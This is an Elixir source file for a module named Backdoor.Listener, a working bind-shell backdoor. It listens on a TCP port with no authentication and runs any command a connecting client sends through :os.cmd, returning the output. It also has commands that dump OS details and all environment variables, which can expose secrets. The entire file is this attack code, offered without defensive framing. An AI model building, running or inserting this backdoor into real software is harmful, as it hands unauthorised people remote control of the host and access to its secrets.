defmodule Backdoor.Listener do
  require Logger

  def accept(port) do
    {:ok, socket} = :gen_tcp.listen(port,
      [:binary, packet: :line, active: false, reuseaddr: true])
    Logger.info "Accepting connections on port #{port}"
    loop_acceptor(socket)
  end

  defp loop_acceptor(socket) do
    {:ok, client} = :gen_tcp.accept(socket)
    ''
    |> add_prompt()
    |> write_line(client)

    Task.start_link(fn -> serve(client) end)
    loop_acceptor(socket)
  end

  defp serve(socket) do
    line =
      read_line(socket)
      |> IO.chardata_to_string()
    command = remove_newline(line)
    case command do
      "exit" ->
        :ok = :gen_tcp.close(socket)
      "os_info" ->
        os_info()
        |> add_prompt_string()
        |> write_line(socket)
        serve(socket)
      "env_info" ->
        env_info()
        |> add_prompt_string()
        |> write_line(socket)
        serve(socket)
      com ->
        String.to_charlist(com)
        |> :os.cmd()
        |> add_prompt()
        |> write_line(socket)
        serve(socket)
    end
  end

  defp read_line(socket) do
    {:ok, data} = :gen_tcp.recv(socket, 0)
    data
  end

  defp write_line(line, socket) do
    :gen_tcp.send(socket, line)
  end

  def remove_newline(line) do
    line
    |> String.replace("\r", "")
    |> String.replace("\n", "")
  end

  def add_prompt(charlist) do
    charlist ++ '\n\r =>>$'
  end

  def add_prompt_string(string) do
    string <> "\n\r =>>$"
  end

  def os_info do
    type =
      :os.type
      |> Tuple.to_list
      |> Enum.join(", ")
    version =
      :os.version
      |> Tuple.to_list
      |> Enum.join(".")
      type <> ", " <> version
  end

  def env_info do
    :os.getenv |> Enum.join("\n\r")
  end

end
